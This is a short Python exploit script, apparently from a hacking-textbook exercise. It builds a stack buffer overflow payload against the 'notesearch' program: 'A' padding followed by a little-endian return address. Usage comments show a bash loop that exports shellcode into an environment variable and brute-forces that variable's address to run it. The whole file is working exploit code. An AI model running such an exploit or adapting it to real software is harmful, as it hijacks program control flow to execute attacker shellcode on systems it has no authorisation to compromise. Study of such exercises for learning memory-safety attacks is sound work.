#!/usr/bin/python


## script to bruteforce the address of the environment variable
## script decrements a base address by a value
## and generates an appropriate overflow for notesearch

# e.g. usage in bash:

# export SHELLCODE=$(cat shellcode_bash.bin)

# for i in $(seq 0 4 1600);
# do echo address_decrement: $i;
# ./notesearch $(./env_location.py -d $i); done



import struct
from optparse import OptionParser

parser = OptionParser()
parser.add_option("-a", "--address", type="int", help="start address -> highest address")
parser.add_option("-d", "--decrement", type="int", help="step size to decrement address")
parser.add_option("-l", "--length", type="int", help="length of the padding")

# Parsing arguments and setting base values
(options, args) = parser.parse_args()
if(options.decrement):
    decrement = options.decrement
else:
    decrement = 0
if(options.address):
    return_address_base = options.address
else:
    return_address_base = 0x00007fffffffebab
if(options.length):
    payload_length = options.length
else:
    payload_length = 120


# Decrementing the Address
return_add = return_address_base - decrement
# Storing address in little endian format
return_address = struct.pack("<Q", return_add)


## padding
padding = 'A' * payload_length

print padding + return_address
